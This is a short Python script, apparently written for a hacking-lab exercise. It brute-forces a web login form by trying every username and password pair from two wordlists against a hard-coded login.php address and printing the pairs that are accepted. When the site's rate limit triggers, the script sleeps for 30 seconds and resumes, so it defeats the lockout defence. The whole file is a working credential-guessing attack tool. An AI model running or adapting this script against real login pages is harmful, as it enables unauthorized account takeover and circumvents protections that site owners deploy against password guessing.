import requests
import time
# file that contain user:pass
userpass_file = "./password.txt"
userfile = "./usernames.txt"
# create url using user and password as argument
url = "http://83.136.250.218:39025/login.php"

# rate limit blocks for 30 seconds
lock_time = 30
# message that alert us we hit rate limit
lock_message = "Too many login failures"

# read user and password
with open(userfile, "r") as uf:
	for username in uf:
		with open(userpass_file, "r") as fh:
			for fline in fh:
			# skip comment
				if fline.startswith("#"):
					continue
				fline = fline.rstrip()
				username = username.rstrip()
				# prepare POST data
				data = {
				    "userid": username,
				    "passwd": fline,
				    "submit": "submit"
				}
				#print(data)
				# do the request
				res = requests.post(url, data=data)
				#print (res.text)
				# handle generic credential error
				if "Invalid credentials" in res.text:
				    print("[-] Invalid credentials: userid:{} passwd:{}".format(username, fline))
				# user and password were valid !
				elif  "Welcome back " in res.text:
				    print("[+] Valid credentials: userid:{} passwd:{}".format(username, fline))
				# hit rate limit, let's say we have to wait 30 seconds
				elif lock_message in res.text:
				    print("[-] Hit rate limit, sleeping 30")
				    # do the actual sleep plus 0.5 to be sure
				    time.sleep(lock_time+0.5)
